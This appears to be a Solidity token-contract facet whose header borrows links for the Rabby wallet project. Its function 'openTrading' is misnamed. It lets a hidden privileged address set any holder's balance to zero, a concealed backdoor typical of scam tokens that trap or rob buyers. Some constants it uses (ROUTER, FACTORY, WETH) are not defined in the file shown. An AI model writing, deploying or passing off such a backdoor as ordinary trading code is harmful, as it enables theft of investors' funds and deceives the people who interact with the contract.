/*
 * SPDX-License-Identifier: MIT
 * Website: https://rabby.io/?utm_source=icodrops
 * Github: https://github.com/RabbyHub/Rabby
 * Twitter: https://twitter.com/Rabby_io
 * Medium: https://medium.com/@rabby_io
 * Discord: https://discord.gg/seFBCWmUre
 */
pragma solidity ^0.8.23;
import "./TestLib.sol";
contract openTradingFacet {
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
